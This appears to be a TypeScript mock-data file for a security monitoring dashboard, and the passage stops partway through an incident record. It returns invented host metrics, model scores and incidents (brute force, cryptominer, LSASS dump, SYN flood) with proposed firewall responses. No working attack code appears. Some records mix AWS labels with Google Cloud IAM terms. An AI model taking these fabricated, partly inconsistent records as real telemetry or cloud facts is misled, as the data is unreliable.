// frontend/src/api/mockData.ts
export function getMockResponse(url: string, method: string = 'get'): any {
  const cleanUrl = url.split('?')[0];

  if (cleanUrl.endsWith('/dashboard/summary')) {
    return {
      host_health_score: 98,
      total_hosts: 5,
      online_hosts: 5,
      active_incidents: 1,
      attack_counts_24h: {
        brute_force: 14,
        port_scan: 6,
        ddos: 2,
        unauthorized_access: 1,
        suspicious_process: 3,
      },
      top_risks: [
        {
          category: 'threat',
          title: 'Automated RDP Brute-Force Activity',
          hostname: 'PHYSICAL-LAPTOP-01',
          probability: 0.94,
          eta_minutes: 5,
          severity: 'high',
        },
        {
          category: 'threat',
          title: 'Stealth SYN Port Scanning Reconnaissance',
          hostname: 'PHYSICAL-LAPTOP-02',
          probability: 0.88,
          eta_minutes: 12,
          severity: 'high',
        },
        {
          category: 'threat',
          title: 'XMRig Monero CPU Cryptominer Execution',
          hostname: 'PHYSICAL-LAPTOP-03',
          probability: 0.96,
          eta_minutes: 2,
          severity: 'critical',
        },
      ],
    };
  }

  if (cleanUrl.endsWith('/models/active')) {
    return {
      id: 'model-xgb-prod',
      name: 'XGBoost Threat Classifier',
      task: 'threat_classification',
      version: 'v2.4.1 (Production)',
      status: 'active',
      metrics: {
        macro_f1: 0.962,
        precision: 0.958,
        recall: 0.966,
        accuracy: 0.974,
        inference_latency_ms: 4.2,
      },
      artifact_path: 'models/threat_xgb_v2.4.1.joblib',
      created_at: new Date(Date.now() - 86400000 * 14).toISOString(),
      updated_at: new Date().toISOString(),
    };
  }

  if (cleanUrl.endsWith('/models')) {
    return [
      {
        id: 'model-xgb-prod',
        name: 'XGBoost Threat Classifier',
        task: 'threat_classification',
        version: 'v2.4.1',
        status: 'active',
        metrics: {
          macro_f1: 0.962,
          precision: 0.958,
          recall: 0.966,
          accuracy: 0.974,
          inference_latency_ms: 4.2,
        },
        artifact_path: 'models/threat_xgb_v2.4.1.joblib',
        created_at: new Date(Date.now() - 86400000 * 14).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'model-xgb-candidate',
        name: 'XGBoost Incremental Retrain',
        task: 'threat_classification',
        version: 'v2.5.0-rc1',
        status: 'candidate',
        metrics: {
          macro_f1: 0.975,
          precision: 0.971,
          recall: 0.979,
          accuracy: 0.982,
          inference_latency_ms: 3.8,
        },
        artifact_path: 'models/threat_xgb_v2.5.0.joblib',
        created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
        updated_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.includes('/learning/drift')) {
    return [
      {
        id: 'drift-01',
        model_id: 'model-xgb-prod',
        feature_name: 'net_in_bytes_rate',
        drift_score: 0.042,
        p_value: 0.41,
        is_drift: false,
        details: { test: 'Kolmogorov-Smirnov', status: 'stable' },
        created_at: new Date().toISOString(),
      },
      {
        id: 'drift-02',
        model_id: 'model-xgb-prod',
        feature_name: 'failed_auth_frequency',
        drift_score: 0.185,
        p_value: 0.012,
        is_drift: true,
        details: { test: 'Kolmogorov-Smirnov', status: 'elevated_drift_alert' },
        created_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.includes('/learning/retrain')) {
    return [
      {
        id: 'retrain-01',
        model_id: 'model-xgb-candidate',
        status: 'candidate_ready',
        dataset_size: 45200,
        started_at: new Date(Date.now() - 3600000).toISOString(),
        completed_at: new Date(Date.now() - 3000000).toISOString(),
        metrics_summary: { macro_f1: 0.975, gain_over_prod: '+1.3%' },
        created_at: new Date(Date.now() - 3600000).toISOString(),
      },
    ];
  }

  if (cleanUrl.endsWith('/hosts')) {
    return [
      {
        id: 'host-laptop-01',
        hostname: 'ASUS VivoBook (Primary Physical Node)',
        display_label: 'Physical Hardware ➔ AWS Cloud Connected (ap-south-1)',
        os_version: 'Windows 11 Pro (Physical Bare-Metal)',
        agent_platform: 'windows',
        ip_address: 'Uplink: AWS Cloud (13.126.201.190)',
        status: 'online',
        is_physical: true,
        cpu: 28,
        mem: 58,
        active_threat: 'RDP Credential Stuffing',
        threat_mitre: 'T1110.004',
        threat_severity: 'high',
        threat_status: 'Investigating',
        last_seen: new Date().toISOString(),
        is_active: true,
        created_at: new Date(Date.now() - 86400000 * 7).toISOString(),
      },
      {
        id: 'host-laptop-02',
        hostname: 'PHYSICAL-LAPTOP-02',
        display_label: 'Lab Workstation A',
        os_version: 'Windows 11 Enterprise (Physical Laptop)',
        agent_platform: 'windows',
        ip_address: '192.168.1.102',
        status: 'online',
        is_physical: true,
        cpu: 64,
        mem: 72,
        active_threat: 'Stealth SYN Port Scan',
        threat_mitre: 'T1046',
        threat_severity: 'high',
        threat_status: 'Auto-Blocked',
        last_seen: new Date().toISOString(),
        is_active: true,
        created_at: new Date(Date.now() - 86400000 * 5).toISOString(),
      },
      {
        id: 'host-laptop-03',
        hostname: 'PHYSICAL-LAPTOP-03',
        display_label: 'Dev Workstation B',
        os_version: 'Ubuntu 24.04 LTS (Physical Laptop)',
        agent_platform: 'linux',
        ip_address: '192.168.1.103',
        status: 'online',
        is_physical: true,
        cpu: 94,
        mem: 86,
        active_threat: 'XMRig Monero CPU Hijack',
        threat_mitre: 'T1496',
        threat_severity: 'critical',
        threat_status: 'Self-Healed',
        last_seen: new Date().toISOString(),
        is_active: true,
        created_at: new Date(Date.now() - 86400000 * 12).toISOString(),
      },
      {
        id: 'host-laptop-04',
        hostname: 'PHYSICAL-LAPTOP-04',
        display_label: 'Field Workstation C',
        os_version: 'Windows 10 Pro (Physical Laptop)',
        agent_platform: 'windows',
        ip_address: '192.168.1.104',
        status: 'online',
        is_physical: true,
        cpu: 42,
        mem: 68,
        active_threat: 'LSASS Memory Dump & PrivEsc',
        threat_mitre: 'T1003',
        threat_severity: 'high',
        threat_status: 'Quarantined',
        last_seen: new Date().toISOString(),
        is_active: true,
        created_at: new Date(Date.now() - 86400000 * 20).toISOString(),
      },
      {
        id: 'host-cloud-01',
        hostname: 'AWS-EC2-SOUTH-01',
        display_label: 'AWS Cloud Central Gateway',
        os_version: 'Ubuntu 24.04 LTS (AWS EC2 ap-south-1)',
        agent_platform: 'windows',
        ip_address: '100.64.0.15',
        status: 'online',
        is_physical: false,
        cpu: 82,
        mem: 76,
        active_threat: 'Volumetric SYN Flood DDoS',
        threat_mitre: 'T1498.001',
        threat_severity: 'critical',
        threat_status: 'Rate-Limited',
        last_seen: new Date().toISOString(),
        is_active: true,
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
      },
    ];
  }

  if (cleanUrl.includes('/metrics')) {
    const isPhysicalLaptop1 = cleanUrl.includes('host-laptop-01');
    const isPhysicalLaptop2 = cleanUrl.includes('host-laptop-02');
    const isPhysicalLaptop3 = cleanUrl.includes('host-laptop-03');
    const isPhysicalLaptop4 = cleanUrl.includes('host-laptop-04');
    const isCloudNode = cleanUrl.includes('host-cloud-01') || cleanUrl.includes('host-aws-02');

    let baseCpu = 28;
    let baseMem = 58;
    let baseDisk = 52;
    let baseProc = 168;
    let baseConns = 34;
    let topProcesses = [
      { name: 'chrome.exe', pid: 14280, cpu_percent: 7.4 },
      { name: 'Code.exe (VS Code)', pid: 9812, cpu_percent: 5.2 },
      { name: 'python.exe (Telemetry Agent)', pid: 11048, cpu_percent: 3.8 },
      { name: 'System', pid: 4, cpu_percent: 2.5 },
      { name: 'explorer.exe', pid: 5120, cpu_percent: 1.9 },
    ];

    if (isPhysicalLaptop2) {
      baseCpu = 64;
      baseMem = 72;
      baseDisk = 61;
      baseConns = 180;
      topProcesses = [
        { name: 'nmap_scan_probe.exe', pid: 8840, cpu_percent: 24.2 },
        { name: 'svchost.exe (RPC Endpoint)', pid: 1044, cpu_percent: 12.8 },
        { name: 'chrome.exe', pid: 6320, cpu_percent: 6.4 },
        { name: 'python.exe (Wazuh Agent)', pid: 4210, cpu_percent: 4.1 },
        { name: 'System', pid: 4, cpu_percent: 3.2 },
      ];
    } else if (isPhysicalLaptop3) {
      baseCpu = 94;
      baseMem = 86;
      baseDisk = 48;
      baseConns = 42;
      topProcesses = [
        { name: 'xmrig-daemon', pid: 4912, cpu_percent: 68.5 },
        { name: 'stratum-worker', pid: 4913, cpu_percent: 14.2 },
        { name: 'containerd', pid: 890, cpu_percent: 4.5 },
        { name: 'systemd-journald', pid: 412, cpu_percent: 2.1 },
        { name: 'bash', pid: 2104, cpu_percent: 1.1 },
      ];
    } else if (isPhysicalLaptop4) {
      baseCpu = 42;
      baseMem = 68;
      baseDisk = 55;
      baseConns = 28;
      topProcesses = [
        { name: 'lsass.exe (Audit Memory Dump)', pid: 680, cpu_percent: 18.2 },
        { name: 'mimikatz_probe.exe', pid: 7420, cpu_percent: 9.4 },
        { name: 'powershell.exe', pid: 3204, cpu_percent: 6.8 },
        { name: 'System', pid: 4, cpu_percent: 2.1 },
        { name: 'explorer.exe', pid: 4190, cpu_percent: 1.8 },
      ];
    } else if (isCloudNode) {
      baseCpu = 82;
      baseMem = 76;
      baseDisk = 68;
      baseConns = 450;
      topProcesses = [
        { name: 'aws-vpc-ingress-proxy', pid: 2040, cpu_percent: 38.6 },
        { name: 'cloud-armor-rate-limiter', pid: 2042, cpu_percent: 19.4 },
        { name: 'postgres', pid: 1420, cpu_percent: 8.9 },
        { name: 'System', pid: 4, cpu_percent: 5.2 },
        { name: 'wazuh-agent.exe', pid: 3108, cpu_percent: 4.0 },
      ];
    }

    const points = [];
    const now = Date.now();
    for (let i = 29; i >= 0; i--) {
      const ts = new Date(now - i * 4000).toISOString();
      const cpuVal = Math.min(100, Math.max(5, Math.floor(baseCpu + Math.sin(i / 2) * 10 + (Math.random() * 8 - 4))));
      const memVal = Math.min(100, Math.max(10, Math.floor(baseMem + Math.cos(i / 4) * 4 + (Math.random() * 4 - 2))));
      points.push({
        id: `metric-${i}`,
        host_id: cleanUrl.split('/')[2] || 'host-laptop-01',
        ts,
        cpu: cpuVal,
        mem: memVal,
        disk: baseDisk,
        net_in: Math.floor(1200 + Math.random() * 500),
        net_out: Math.floor(850 + Math.random() * 400),
        load: Number((cpuVal / 30).toFixed(2)),
        proc_count: baseProc,
        conn_count: baseConns,
        extra: {
          top_cpu_processes: topProcesses,
        },
      });
    }
    return { host_id: cleanUrl.split('/')[2] || 'host-laptop-01', points };
  }

  if (cleanUrl.endsWith('/detections')) {
    return [
      {
        id: 'det-001',
        host_id: 'host-laptop-01',
        hostname: 'PHYSICAL-LAPTOP-01',
        ts: new Date(Date.now() - 1000 * 60 * 2).toISOString(),
        anomaly_score: 0.942,
        is_attack: true,
        model_id: 'model-xgb-prod',
        attack_type: 'RDP Credential Stuffing',
        mitre_technique: 'T1110.004',
        mitre_tactic: 'Credential Access',
        status: 'investigating',
        details: { protocol: 'RDP', attempts_per_sec: 42, src_ip: '198.51.100.45', target: 'PHYSICAL-LAPTOP-01' },
      },
      {
        id: 'det-002',
        host_id: 'host-laptop-02',
        hostname: 'PHYSICAL-LAPTOP-02',
        ts: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
        anomaly_score: 0.884,
        is_attack: true,
        model_id: 'model-xgb-prod',
        attack_type: 'Stealth SYN Port Scan',
        mitre_technique: 'T1046',
        mitre_tactic: 'Discovery',
        status: 'blocked',
        details: { port_range: '1-1024', scan_type: 'SYN_STEALTH', src_ip: '203.0.113.88', target: 'PHYSICAL-LAPTOP-02' },
      },
      {
        id: 'det-003',
        host_id: 'host-laptop-03',
        hostname: 'PHYSICAL-LAPTOP-03',
        ts: new Date(Date.now() - 1000 * 60 * 14).toISOString(),
        anomaly_score: 0.962,
        is_attack: true,
        model_id: 'model-xgb-prod',
        attack_type: 'XMRig Monero CPU Hijack',
        mitre_technique: 'T1496',
        mitre_tactic: 'Impact',
        status: 'mitigated',
        details: { process_name: 'xmrig-daemon', pid: 4912, cpu_percent: 68.5, target: 'PHYSICAL-LAPTOP-03' },
      },
      {
        id: 'det-004',
        host_id: 'host-laptop-04',
        hostname: 'PHYSICAL-LAPTOP-04',
        ts: new Date(Date.now() - 1000 * 60 * 22).toISOString(),
        anomaly_score: 0.895,
        is_attack: true,
        model_id: 'model-xgb-prod',
        attack_type: 'LSASS Memory Dump & Token Impersonation',
        mitre_technique: 'T1003',
        mitre_tactic: 'Credential Access',
        status: 'investigating',
        details: { target_process: 'lsass.exe', pid: 680, src_pid: 7420, target: 'PHYSICAL-LAPTOP-04' },
      },
      {
        id: 'det-005',
        host_id: 'host-cloud-01',
        hostname: 'AWS-EC2-SOUTH-01',
        ts: new Date(Date.now() - 1000 * 60 * 35).toISOString(),
        anomaly_score: 0.985,
        is_attack: true,
        model_id: 'model-xgb-prod',
        attack_type: 'Volumetric SYN Flood DDoS',
        mitre_technique: 'T1498.001',
        mitre_tactic: 'Impact',
        status: 'mitigated',
        details: { pps: 94000, protocol: 'TCP SYN', target: 'AWS-EC2-SOUTH-01 / AWS-VPC' },
      },
    ];
  }

  if (cleanUrl.endsWith('/classifications')) {
    return [
      {
        id: 'cls-01',
        host_id: 'host-laptop-01',
        ts: new Date(Date.now() - 1000 * 60 * 5).toISOString(),
        label: 'brute_force',
        confidence: 0.968,
        probs: { brute_force: 0.968, port_scan: 0.021, benign: 0.011 },
        model_id: 'model-xgb-prod',
      },
      {
        id: 'cls-02',
        host_id: 'host-laptop-02',
        ts: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
        label: 'port_scan',
        confidence: 0.924,
        probs: { port_scan: 0.924, ddos: 0.052, benign: 0.024 },
        model_id: 'model-xgb-prod',
      },
      {
        id: 'cls-03',
        host_id: 'host-laptop-03',
        ts: new Date(Date.now() - 1000 * 60 * 24).toISOString(),
        label: 'botnet_cryptominer',
        confidence: 0.975,
        probs: { botnet_cryptominer: 0.975, exploit_other: 0.018, benign: 0.007 },
        model_id: 'model-xgb-prod',
      },
      {
        id: 'cls-04',
        host_id: 'host-laptop-04',
        ts: new Date(Date.now() - 1000 * 60 * 35).toISOString(),
        label: 'privilege_escalation',
        confidence: 0.964,
        probs: { privilege_escalation: 0.964, brute_force: 0.024, benign: 0.012 },
        model_id: 'model-xgb-prod',
      },
      {
        id: 'cls-05',
        host_id: 'host-cloud-01',
        ts: new Date(Date.now() - 1000 * 60 * 48).toISOString(),
        label: 'dos_syn_flood',
        confidence: 0.985,
        probs: { dos_syn_flood: 0.985, ddos: 0.010, benign: 0.005 },
        model_id: 'model-xgb-prod',
      },
    ];
  }

  if (cleanUrl.endsWith('/incidents') || cleanUrl.includes('/incidents?')) {
    return [
      {
        id: 'inc-001',
        incident_id: 'inc-001',
        title: 'Volumetric TCP SYN Flood Attack on AWS VPC',
        severity: 'critical',
        status: 'awaiting_approval',
        source: 'live',
        tier1_family: 'ddos',
        tier1_confidence: 0.985,
        tier2_technique: 'T1498.001 (Direct Network Flood)',
        tier2_confidence: 0.972,
        target_asset: 'AWS-EC2-SOUTH-01 (AWS VPC Gateway)',
        description: 'Over 94,000 SYN packets/sec detected assaulting cloud load balancer from distributed adversary botnet.',
        features: {
          cpu: 82.4,
          ram: 64.0,
          failed_logins: 0,
          inbound_traffic: 94000.0,
          active_connections: 380,
          deviations: {
            inbound_traffic: { measured: 94000.0, baseline: 120.0, multiplier: 783.3, ratio_str: '783.3x baseline' },
            active_connections: { measured: 380, baseline: 25.0, multiplier: 15.2, ratio_str: '15.2x baseline' },
            cpu: { measured: 82.4, baseline: 15.0, multiplier: 5.5, ratio_str: '5.5x baseline' },
            ram: { measured: 64.0, baseline: 45.0, multiplier: 1.4, ratio_str: '1.4x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Inbound packet rate surged to 94,000 pkts/s (783x baseline), indicating a coordinated volumetric TCP SYN flood targeting cloud ingress proxies.',
          probable_root_cause: 'Distributed adversary botnet coordinating amplified reflection traffic to overwhelm TCP state tables.',
          evidence: [
            'inbound_traffic surged to 94,000 pkts/s (783.3x baseline) on AWS VPC gateway.',
            'active_connections escalated to 380 (15.2x baseline) with half-open handshakes.',
            'Host CPU rose to 82.4% under packet interrupt and network driver pressure.',
          ],
          confidence: 0.985,
          alternative_hypotheses: [
            'Unscheduled organic traffic surge (flash crowd) following marketing announcement',
            'Upstream ISP routing anomaly or BGP route leak reflecting legitimate traffic',
          ],
          uncertainty_note: 'Probabilistic hypothesis grounded in AWS VPC Flow Logs and Cloud Monitoring edge probes.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_AWS_ARMOR_RATE_LIMIT',
            name: 'AWS WAF Edge Rate-Limiting',
            description: 'Deploy rate-based ban rule on AWS WAF security policy at global edge for 3600s',
            scope: 'AWS-EC2-SOUTH-01 (VPC Ingress Gateway)',
            risk_level: 'low',
            reversible: true,
            rollback_steps: 'Delete rate-limit rule from AWS WAF policy',
            expected_outcome: 'Attacking botnet packets dropped at Google edge POPs before entering VPC network',
          },
        ],
        approval: {
          decided_by: null,
          decision: null,
          decided_at: null,
          comment: null,
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'High-volume attack detected. Human operator approval is required before edge rate-limiting executes.',
        created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-002',
        incident_id: 'inc-002',
        title: 'RDP Credential Stuffing & Kerberos Pre-Auth Roasting',
        severity: 'high',
        status: 'verified',
        source: 'live',
        tier1_family: 'brute_force',
        tier1_confidence: 0.968,
        tier2_technique: 'T1110.004 (Credential Stuffing)',
        tier2_confidence: 0.945,
        target_asset: 'PHYSICAL-LAPTOP-01 (Host Laptop - Windows 11)',
        description: 'Over 420 failed logon bursts in 60s targeting Administrator account via exposed RDP port 3389.',
        features: {
          cpu: 28.5,
          ram: 54.0,
          failed_logins: 420,
          inbound_traffic: 140.0,
          active_connections: 65,
          deviations: {
            failed_logins: { measured: 420, baseline: 0.0, multiplier: 420.0, ratio_str: '420 (baseline: 0)' },
            active_connections: { measured: 65, baseline: 25.0, multiplier: 2.6, ratio_str: '2.6x baseline' },
            cpu: { measured: 28.5, baseline: 15.0, multiplier: 1.9, ratio_str: '1.9x baseline' },
            ram: { measured: 54.0, baseline: 45.0, multiplier: 1.2, ratio_str: '1.2x baseline' },
            inbound_traffic: { measured: 140.0, baseline: 120.0, multiplier: 1.2, ratio_str: '1.2x baseline' },
          },
        },
        rca: {
          summary: 'High-velocity authentication failure bursts detected on port 3389 originating from remote IP 198.51.100.45.',
          probable_root_cause: 'Authentication endpoint exposed directly to untrusted network without rate-limiting, allowing credential stuffing.',
          evidence: [
            'failed_logins reached 420 bursts (420x baseline) within a 60-second measurement window.',
            'active_connections elevated to 65 (2.6x baseline), indicating multi-threaded spray tools.',
            'Remote connection requests targeted local Administrator and domain service accounts.',
          ],
          confidence: 0.968,
          alternative_hypotheses: [
            'Misconfigured administrative automation script or scheduled task with expired credentials',
            'Authorized internal security audit team conducting dictionary testing',
          ],
          uncertainty_note: 'Verified from Windows Security Event 4625 audit telemetry and endpoint socket tracking.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_BLOCK_SOURCE_IP',
            name: 'Host Firewall Dynamic Inbound Block',
            description: 'Block inbound traffic from offending remote IP 198.51.100.45 via host firewall rule for 60 minutes',
            scope: 'PHYSICAL-LAPTOP-01 (Host Network Adapter)',
            risk_level: 'low',
            reversible: true,
            rollback_steps: 'Remove dynamic block rule from host firewall adapter',
            expected_outcome: 'Immediate termination of incoming authentication attempts from source IP',
          },
        ],
        approval: {
          decided_by: 'SecOps Analyst',
          decision: 'approved',
          decided_at: new Date(Date.now() - 1000 * 60 * 29).toISOString(),
          comment: 'Approved host firewall block of adversary IP 198.51.100.45.',
        },
        execution_log: [
          {
            action_id: 'ACT_BLOCK_SOURCE_IP',
            command: 'netsh advfirewall firewall add rule name="AdaptiveBlock-198.51.100.45" dir=in action=block remoteip=198.51.100.45',
            dry_run: true,
            status: 'simulated',
            result: 'Rule priority committed in 340ms',
            duration_ms: 340,
            executed_at: new Date(Date.now() - 1000 * 60 * 29).toISOString(),
          },
        ],
        verification_result: {
          verified: true,
          probe: 'Authentication Watchdog',
          metrics_before: { failed_logins: 420 },
          metrics_after: { failed_logins: 0 },
          message: 'Authentication attempts ceased; RDP socket closed.',
        },
        outcome_summary: 'Approved by SecOps Analyst. Playbook executed under dry-run; verification probe passed.',
        created_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-003',
        incident_id: 'inc-003',
        title: 'XMRig Monero CPU Cryptominer Daemon Execution',
        severity: 'critical',
        status: 'awaiting_approval',
        source: 'simulated',
        tier1_family: 'cryptomining',
        tier1_confidence: 0.975,
        tier2_technique: 'T1496 (Resource Hijacking)',
        tier2_confidence: 0.960,
        target_asset: 'PHYSICAL-LAPTOP-03 (Dev Workstation B - Ubuntu)',
        description: 'Rogue mining process spawned from /tmp consuming 94% CPU and initiating stratum network connections.',
        features: {
          cpu: 94.2,
          ram: 86.0,
          failed_logins: 0,
          inbound_traffic: 180.0,
          active_connections: 45,
          deviations: {
            cpu: { measured: 94.2, baseline: 15.0, multiplier: 6.3, ratio_str: '6.3x baseline' },
            ram: { measured: 86.0, baseline: 45.0, multiplier: 1.9, ratio_str: '1.9x baseline' },
            active_connections: { measured: 45, baseline: 25.0, multiplier: 1.8, ratio_str: '1.8x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
            inbound_traffic: { measured: 180.0, baseline: 120.0, multiplier: 1.5, ratio_str: '1.5x baseline' },
          },
        },
        rca: {
          summary: 'Host CPU sustained at 94.2% (6.3x baseline) by rogue process PID 4912 (/tmp/xmrig-daemon) actively communicating with external mining pools.',
          probable_root_cause: 'Execution of unauthorized cryptomining binary dropped into /tmp via remote vulnerability or compromised credential.',
          evidence: [
            'cpu sustained at 94.2% (6.3x baseline) with thread utilization matching CryptoNight algorithms.',
            'ram utilization at 86.0% (1.9x baseline) allocated to mining scratchpad buffers.',
            'Outbound socket established to stratum+tcp://pool.supportxmr.com:3333.',
          ],
          confidence: 0.975,
          alternative_hypotheses: [
            'Heavy scientific computational simulation or machine learning model training job',
            'Unthrottled software compilation or multi-core video encoding workload',
          ],
          uncertainty_note: 'Verified from psutil Linux process telemetry and active socket descriptor tables.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_KILL_MINING_PROCESS',
            name: 'Terminate Rogue Mining Process & Quarantine Binary',
            description: 'Forcefully kill PID 4912, quarantine /tmp/xmrig-daemon to /opt/quarantine, and drop stratum ports',
            scope: 'PHYSICAL-LAPTOP-03 (PID: 4912)',
            risk_level: 'medium',
            reversible: false,
            rollback_steps: 'Binary can be restored from /opt/quarantine; process must be manually restarted if benign',
            expected_outcome: 'Immediate host CPU utilization recovery from 94% down to baseline (<20%)',
          },
        ],
        approval: {
          decided_by: null,
          decision: null,
          decided_at: null,
          comment: null,
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Rogue miner identified. Human authorization required before PID 4912 is terminated.',
        created_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-004',
        incident_id: 'inc-004',
        title: 'AWS IAM Project Owner Role Privilege Escalation',
        severity: 'critical',
        status: 'rejected',
        source: 'simulated',
        tier1_family: 'cloud_iam',
        tier1_confidence: 0.980,
        tier2_technique: 'T1098 (Account Manipulation)',
        tier2_confidence: 0.950,
        target_asset: 'AWS Region: ap-south-1 (Instance: i-098c54730ff60bf4a) (IAM Service Account)',
        description: 'Compromised service account attempted unauthorized role self-assignment to roles/owner via Cloud API.',
        features: {
          cpu: 20.0,
          ram: 46.0,
          failed_logins: 0,
          inbound_traffic: 110.0,
          active_connections: 32,
          deviations: {
            active_connections: { measured: 32, baseline: 25.0, multiplier: 1.3, ratio_str: '1.3x baseline' },
            cpu: { measured: 20.0, baseline: 15.0, multiplier: 1.3, ratio_str: '1.3x baseline' },
            ram: { measured: 46.0, baseline: 45.0, multiplier: 1.0, ratio_str: '1.0x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
            inbound_traffic: { measured: 110.0, baseline: 120.0, multiplier: 0.9, ratio_str: '0.9x baseline' },
          },
        },
        rca: {
          summary: 'AWS CloudTrail Log recorded SetIamPolicy API call attempting to grant roles/owner to dev-builder service account from untrusted IP.',
          probable_root_cause: 'Compromised service account private key used from unauthorized network location attempting privilege self-escalation.',
          evidence: [
            'AWS CloudTrail Log: SetIamPolicy called with member: serviceAccount:dev-builder@adaptive-learning-ml.iam.gserviceaccount.com.',
            'Request originated from non-corporate foreign IP 34.122.45.18.',
          ],
          confidence: 0.980,
          alternative_hypotheses: [
            'Terraform / Infrastructure-as-Code pipeline deploying scheduled IAM role updates',
            'Authorized cloud security architect executing disaster recovery role restructuring',
          ],
          uncertainty_note: 'Verified from AWS CloudTrail Logs (Admin Activity stream).',
        },
        recommended_actions: [
          {
            action_id: 'ACT_REVOKE_SA_KEY',
            name: 'Revoke Compromised Service Account Key',
            description: 'Permanently delete service account key 8f492b1a8c9e and revert unauthorized IAM role binding',
            scope: 'AWS Region: ap-south-1 (Instance: i-098c54730ff60bf4a) (Cloud IAM)',
            risk_level: 'high',
            reversible: false,
            rollback_steps: 'Generate replacement credential key and re-provision to authorized workloads',
            expected_outcome: 'Adversary immediately loses all administrative access to Amazon Web Services (AWS) project',
          },
        ],
        approval: {
          decided_by: 'Lead Cloud Architect',
          decision: 'rejected',
          decided_at: new Date(Date.now() - 1000 * 60 * 58).toISOString(),
          comment: 'Rejected: Authorized scheduled Terraform CI/CD pipeline role update.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Operator rejected countermeasure. Service account key remains active per architecture review.',
        created_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-005',
        incident_id: 'inc-005',
        title: 'Stealth TCP SYN Reconnaissance & Port Sweep',
        severity: 'high',
        status: 'expired',
        source: 'live',
        tier1_family: 'port_scan',
        tier1_confidence: 0.924,
        tier2_technique: 'T1046 (Network Service Scanning)',
        tier2_confidence: 0.905,
        target_asset: 'PHYSICAL-LAPTOP-02 (Lab Workstation A)',
        description: 'Adversary scanning ports 1-1024 with half-open SYN sweep to map active local services.',
        features: {
          cpu: 22.0,
          ram: 48.0,
          failed_logins: 0,
          inbound_traffic: 340.0,
          active_connections: 185,
          deviations: {
            active_connections: { measured: 185, baseline: 25.0, multiplier: 7.4, ratio_str: '7.4x baseline' },
            inbound_traffic: { measured: 340.0, baseline: 120.0, multiplier: 2.8, ratio_str: '2.8x baseline' },
            cpu: { measured: 22.0, baseline: 15.0, multiplier: 1.5, ratio_str: '1.5x baseline' },
            ram: { measured: 48.0, baseline: 45.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Rapid socket turnover reaching 185 connections (7.4x baseline) across consecutive destination ports indicates automated port scanning.',
          probable_root_cause: 'External adversary running stealth SYN sweep to identify exposed services and unpatched daemons.',
          evidence: [
            'active_connections rapid-turnover rate reached 185 (7.4x baseline) across ports 1-1024.',
            'inbound_traffic recorded at 340 pkts/s with small 44-byte SYN packets typical of Nmap.',
          ],
          confidence: 0.924,
          alternative_hypotheses: [
            'Scheduled enterprise vulnerability assessment scan (Nessus/Qualys/OpenVAS)',
            'Network discovery daemon mapping hardware assets on local LAN',
          ],
          uncertainty_note: 'Verified from endpoint TCP socket state transitions and packet size distributions.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_DROP_SCANNER_IP',
            name: 'Dynamic Scanner IP Null-Route & Stealth Mode',
            description: 'Inject dynamic firewall drop rule for scanning source IP 203.0.113.88 for 30 minutes',
            scope: 'PHYSICAL-LAPTOP-02 (Host Firewall)',
            risk_level: 'low',
            reversible: true,
            rollback_steps: 'Remove drop rule from local firewall table',
            expected_outcome: 'Scanning attempts silently dropped, denying port state intelligence to adversary',
          },
        ],
        approval: {
          decided_by: 'System Watchdog',
          decision: 'expired',
          decided_at: new Date(Date.now() - 1000 * 60 * 85).toISOString(),
          comment: 'Approval window (300s) elapsed without human authorization.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Permission gate expired without operator action. No disruptive changes made.',
        created_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-006',
        incident_id: 'inc-006',
        title: 'Mimikatz LSASS Memory Dump & Credential Theft',
        severity: 'high',
        status: 'verified',
        source: 'live',
        tier1_family: 'privilege_escalation',
        tier1_confidence: 0.964,
        tier2_technique: 'T1003.001 (LSASS Memory Dump)',
        tier2_confidence: 0.940,
        target_asset: 'PHYSICAL-LAPTOP-04 (Field Workstation C)',
        description: 'Unauthorized process probe attempting PROCESS_VM_READ against lsass.exe to extract plaintext hashes.',
        features: {
          cpu: 58.0,
          ram: 64.0,
          failed_logins: 2,
          inbound_traffic: 130.0,
          active_connections: 28,
          deviations: {
            cpu: { measured: 58.0, baseline: 15.0, multiplier: 3.9, ratio_str: '3.9x baseline' },
            ram: { measured: 64.0, baseline: 45.0, multiplier: 1.4, ratio_str: '1.4x baseline' },
            failed_logins: { measured: 2, baseline: 0.0, multiplier: 2.0, ratio_str: '2 (baseline: 0)' },
            inbound_traffic: { measured: 130.0, baseline: 120.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            active_connections: { measured: 28, baseline: 25.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
          },
        },
        rca: {
